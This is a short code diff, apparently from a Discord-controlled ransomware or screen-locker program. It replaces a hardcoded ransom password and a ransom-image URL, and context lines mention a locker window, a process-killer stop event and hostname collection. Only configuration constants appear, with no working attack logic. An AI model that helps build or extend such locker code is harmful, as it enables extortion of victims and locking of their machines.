@@ -444,8 +444,8 @@ async def on_ready():
 
 
 log_channel_id = 0
-RANSOM_PW = "N4vi_0n_T0p"
-IMAGE_URL = "https://i.ibb.co/KpxXhQhm/image.png"
+RANSOM_PW = "kakalialia1239.d5h976vcj867c346J"
+IMAGE_URL = "https://chatgpt.com/backend-api/estuary/content?id=file_000000006c5871fbb26cd201c1f8bda9&ts=495588&p=fs&cid=1&sig=e900c9cf3f9e9b2319e35c3970b5ddffaf353af284477969260b91b8a8e009f7&v=0"
 HOSTNAME = socket.gethostname()
 locker_window = None
 _killer_stop = threading.Event()
